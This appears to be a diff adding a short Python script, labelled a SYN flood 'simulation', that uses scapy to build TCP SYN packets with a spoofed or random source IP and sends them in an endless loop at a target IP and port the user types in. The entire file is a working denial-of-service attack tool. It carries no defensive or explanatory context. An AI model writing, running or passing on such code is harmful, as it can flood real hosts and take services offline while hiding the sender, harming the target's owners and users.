@@ -1,0 +1,23 @@
+import scapy.all as scp
+import random
+
+MAX_PORT = 65535
+
+ip_src = input("Fake Source IP (blank for random IP): ")
+ip_dst = input("Target IP: ")
+target_port = input("Target Port: ")
+
+
+def synflood_simulation(ip_src, ip_dst, target_port):
+    ip_layer = scp.IP(src=scp.RandIP(), dst=ip_dst)
+    if ip_src:
+        ip_layer.src = ip_src
+
+    tcp_layer = scp.TCP(dport=int(target_port), flags="S")
+    packet = ip_layer / tcp_layer
+
+    scp.send(packet, loop=1)
+    print(packet)
+
+
+synflood_simulation(ip_src, ip_dst, target_port)
